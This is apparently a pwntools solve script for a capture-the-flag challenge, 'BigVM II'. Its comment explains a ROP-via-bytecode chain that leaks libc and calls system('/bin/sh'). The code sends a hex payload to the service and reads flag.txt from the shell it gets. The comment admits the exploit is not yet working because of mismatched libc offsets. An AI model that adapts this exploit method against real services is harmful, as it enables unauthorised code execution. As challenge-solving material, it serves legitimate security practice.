import os

from pwn import context, remote

# Adapted from the challenge's own checker/solve.py (author-provided).
#
# The BigVM II interpreter has an arbitrary-code-execution bug in its
# bytecode engine; exploit.bin (assembled from exploit.asm via the
# challenge's own asm.py -- see checker/exploit.asm for the full,
# human-readable ROP-via-bytecode chain that leaks a stack address,
# computes a `pop rax; pop rbx; pop r12; pop r13; pop rbp; ret` gadget
# and a libc base, and finally calls system("/bin/sh")) is sent as the
# VM's raw hex-encoded program, giving a real shell.
#
# STATUS: NOT YET WORKING. Confirmed live (both in-cluster and against a
# plain local `docker run` of the exact shipped image) that this exact
# precompiled exploit.bin crashes the target with SIGILL as soon as it
# tries to use the ROP gadget: readelf shows this libc.so.6's .text
# starts at file offset 0x28400, but exploit.asm's hardcoded gadget sits
# at libc_base+0x20334 -- outside any executable section entirely, and
# the hardcoded "system()" offset (+0x301a0) doesn't match this libc's
# real system() symbol (0x53110 per `readelf -s`) either. The checked-in
# exploit.bin/exploit.asm were evidently built against a different
# libc.so.6 revision than the one actually shipped in source/glibc/ for
# this challenge.
#
# Next step for whoever picks this up: the VM's `ldri r3, 32` /
# `subi r3, 0x45ee` sequence leaks *some* fixed address (likely a GOT
# entry read through the VM's own struct); figure out exactly what it
# points at, then recompute both the gadget offset (a real
# `pop rax; pop rbx; pop r12; pop r13; pop rbp; ret` -- or an equivalent
# sequence reachable with the VM's limited instruction set -- doesn't
# appear to exist verbatim in this libc via `ropper`'s exact-string
# search, so an equivalent *combination* of shorter gadgets may be
# needed instead) and the system() offset relative to that same leak,
# against the real source/glibc/libc.so.6 shipped with this challenge.
context.log_level = "debug"

HOST = os.environ.get("SERVICE_BIGVM2_SHELL_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_BIGVM2_SHELL_PORT", "1337"))

payload = open("./exploit.bin", "rb").read().hex()

p = remote(HOST, PORT)
p.sendlineafter(b"bytes:", payload.encode())

p.sendline(b"cat flag.txt")
flag = p.recvall(timeout=30)
print(flag.decode(errors="replace"))
p.close()
